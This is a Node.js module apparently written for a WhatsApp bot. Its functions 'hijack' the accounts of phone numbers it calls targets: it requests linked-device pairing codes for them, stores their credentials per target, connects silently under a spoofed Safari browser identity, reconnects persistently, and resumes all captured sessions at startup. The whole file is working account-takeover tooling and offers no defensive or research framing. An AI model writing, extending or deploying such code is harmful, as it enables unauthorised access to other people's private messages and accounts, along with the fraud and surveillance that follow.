// language: JavaScript, file: lib/hijackSession.js
'use strict';

const fs     = require('fs');
const path   = require('path');
const pino   = require('pino');
const {
    default: makeWASocket,
    useMultiFileAuthState,
    DisconnectReason,
    fetchLatestBaileysVersion,
    makeCacheableSignalKeyStore,
    Browsers,
} = require('@itsliaaa/baileys');

const ROOT = path.join(process.cwd(), 'hijack_sessions');
const activeHijackSessions = new Map(); // key: `${scope}:${phone}`

let _baileysVersion = null;
async function getBaileysVersion() {
    if (_baileysVersion) return _baileysVersion;
    try {
        const { version } = await fetchLatestBaileysVersion();
        _baileysVersion = version;
        return version;
    } catch {
        _baileysVersion = [2, 3000, 1023223821];
        return _baileysVersion;
    }
}

function ensureDir(p) {
    if (!fs.existsSync(p)) fs.mkdirSync(p, { recursive: true });
}

function scopeDir(scope) {
    const clean = String(scope).replace(/[^\w.-]/g, '_');
    return path.join(ROOT, clean);
}

function targetDir(scope, phone) {
    return path.join(scopeDir(scope), String(phone).replace(/\D/g, ''));
}

function readTargets(scope) {
    const dir = scopeDir(scope);
    if (!fs.existsSync(dir)) return [];
    try {
        return fs.readdirSync(dir, { withFileTypes: true })
            .filter(d => d.isDirectory())
            .map(d => d.name);
    } catch { return []; }
}

function addTarget(scope, phone) {
    const clean = String(phone).replace(/\D/g, '');
    if (!clean) return readTargets(scope);
    ensureDir(targetDir(scope, clean));
    return readTargets(scope);
}

function hasCreds(scope, targetPhone) {
    const file = path.join(targetDir(scope, targetPhone), 'creds.json');
    if (!fs.existsSync(file)) return false;
    try {
        const data = JSON.parse(fs.readFileSync(file, 'utf8'));
        return data?.registered === true;
    } catch {
        return false;
    }
}

function wipeTarget(scope, phone) {
    const dir = targetDir(scope, phone);
    if (fs.existsSync(dir)) {
        try { fs.rmSync(dir, { recursive: true, force: true }); } catch {}
    }
}

function formatPairingCode(code) {
    const clean = String(code || '').replace(/[^a-z0-9]/gi, '').toUpperCase();
    return clean.match(/.{1,4}/g)?.join('-') || clean;
}

async function getHijackPairingCode(sock, phone) {
    return new Promise((resolve, reject) => {
        let settled = false;
        const timer = setTimeout(() => {
            if (settled) return;
            settled = true;
            reject(new Error('Timed out — WhatsApp did not send a code in 65s.'));
        }, 65_000);

        setTimeout(() => {
            sock.requestPairingCode(phone)
                .then(c => {
                    if (settled) return;
                    settled = true;
                    clearTimeout(timer);
                    resolve(formatPairingCode(c));
                })
                .catch(e => {
                    if (settled) return;
                    settled = true;
                    clearTimeout(timer);
                    reject(e);
                });
        }, 1500);
    });
}

// ──────────────────────────────────────────────────────────────────
// startHijackSession — robust socket boot + keep-alive + reconnect
// ──────────────────────────────────────────────────────────────────
async function startHijackSession(scope, phone, forceNew = false) {
    const cleanPhone = String(phone).replace(/\D/g, '');
    const sessionKey = `${scope}:${cleanPhone}`;
    const dir = targetDir(scope, cleanPhone);
    ensureDir(dir);

    const existing = activeHijackSessions.get(sessionKey);

    // Return active socket if already running and not forced
    if (!forceNew && existing?.sock) {
        return existing.sock;
    }

    // Clear old session if forcing
    if (forceNew && existing) {
        if (existing.reconnectTimer) clearTimeout(existing.reconnectTimer);
        try { existing.sock?.end(); } catch {}
        activeHijackSessions.delete(sessionKey);
    }

    let { state, saveCreds } = await useMultiFileAuthState(dir);
    const version = await getBaileysVersion();

    const sock = makeWASocket({
        version,
        logger: pino({ level: 'silent' }),
        browser: Browsers.macOS('Safari'),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })),
        },
        syncFullHistory: false,
        markOnlineOnConnect: false,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 15000,
        getMessage: async () => ({ conversation: ' ' }),
    });

    activeHijackSessions.set(sessionKey, {
        sock,
        scope,
        phone: cleanPhone,
        retries: 0,
        connected: false,
        registered: Boolean(state.creds?.registered)
    });

    sock.ev.on('creds.update', saveCreds);

    sock.ev.on('connection.update', async ({ connection, lastDisconnect }) => {
        const session = activeHijackSessions.get(sessionKey);
        if (!session || session.sock !== sock) return;

        if (connection === 'open') {
            session.connected = true;
            session.registered = true;
            session.retries = 0;
            session.reconnectTimer = null;
            console.log(`[hijack:${cleanPhone}] Session opened`);
        }

        if (connection === 'close') {
            session.connected = false;
            const code = lastDisconnect?.error?.output?.statusCode;

            // 515 = restart required after pairing
            if (code === 515) {
                console.log(`[hijack:${cleanPhone}] 515 restart required`);
                setTimeout(() => {
                    if (activeHijackSessions.get(sessionKey)?.sock === sock) {
                        activeHijackSessions.delete(sessionKey);
                        startHijackSession(scope, cleanPhone).catch(() => {});
                    }
                }, 3000);
                return;
            }

            // ONLY real logout deletes the session folder
            const isRealLogout = code === DisconnectReason.loggedOut || code === 401;
            if (isRealLogout) {
                if (!sock._pairingInProgress) {
                    console.log(`[hijack:${cleanPhone}] Logged out — cleaning session`);
                    activeHijackSessions.delete(sessionKey);
                    try { fs.rmSync(dir, { recursive: true, force: true }); } catch {}
                }
                return;
            }

            // Everything else → reconnect
            session.retries = (session.retries || 0) + 1;
            const jitter = Math.random() * 2500;
            const delay = Math.min(5000 * Math.pow(1.55, session.retries - 1), 75000) + jitter;
            console.log(`[hijack:${cleanPhone}] Reconnecting in ${Math.round(delay/1000)}s...`);

            if (session.reconnectTimer) clearTimeout(session.reconnectTimer);
            session.reconnectTimer = setTimeout(() => {
                if (activeHijackSessions.get(sessionKey)?.sock !== sock) return;
                activeHijackSessions.delete(sessionKey);
                startHijackSession(scope, cleanPhone).catch(() => {});
            }, delay);
        }
    });

    return sock;
}

// ──────────────────────────────────────────────────────────────────
// bootHijackSession — gets the socket, waits for 'open' if booting
// ──────────────────────────────────────────────────────────────────
async function bootHijackSession(scope, targetPhone) {
    const phone = String(targetPhone).replace(/\D/g, '');
    const sessionKey = `${scope}:${phone}`;
    
    // If already connected in memory, return instantly
    const existing = activeHijackSessions.get(sessionKey);
    if (existing?.sock && existing.connected) {
        return existing.sock;
    }

    // Otherwise boot/reboot
    const sock = await startHijackSession(scope, phone);
    
    // If it opened instantly before we attached the listener, return
    if (activeHijackSessions.get(sessionKey)?.connected) return sock;

    // Wait for connection open
    await new Promise((resolve, reject) => {
        let settled = false;
        const timer = setTimeout(() => {
            if (settled) return;
            settled = true;
            reject(new Error('hijack socket open timeout'));
        }, 30000);
        
        const check = ({ connection }) => {
            if (settled) return;
            if (connection === 'open') {
                settled = true;
                clearTimeout(timer);
                sock.ev.off('connection.update', check);
                resolve();
            }
            if (connection === 'close') {
                settled = true;
                clearTimeout(timer);
                sock.ev.off('connection.update', check);
                reject(new Error('hijack socket closed during boot'));
            }
        };
        
        sock.ev.on('connection.update', check);
    });

    return sock;
}

// ──────────────────────────────────────────────────────────────────
// resumeHijackSessions — call this on bot startup (index.js)
// ──────────────────────────────────────────────────────────────────
async function resumeHijackSessions() {
    if (!fs.existsSync(ROOT)) return;
    const scopes = fs.readdirSync(ROOT).filter(d => fs.statSync(path.join(ROOT, d)).isDirectory());
    let count = 0;

    for (const scope of scopes) {
        const scopePath = path.join(ROOT, scope);
        const phones = fs.readdirSync(scopePath).filter(d => fs.statSync(path.join(scopePath, d)).isDirectory());
        
        for (const phone of phones) {
            if (!hasCreds(scope, phone)) continue;
            try {
                console.log(`[hijack] Resuming session ${scope} -> ${phone}`);
                await startHijackSession(scope, phone);
                count++;
                await new Promise(r => setTimeout(r, 2000)); // stagger boots
            } catch (e) {
                console.error(`[hijack] Resume error for ${scope}:${phone}`, e.message);
            }
        }
    }
    if (count > 0) console.log(`📂 Resumed ${count} hijack session(s)`);
}

module.exports = {
    readTargets, addTarget, hasCreds, wipeTarget,
    startHijackSession, bootHijackSession, resumeHijackSessions,
    getHijackPairingCode,
    activeHijackSessions,
    scopeDir, targetDir,
};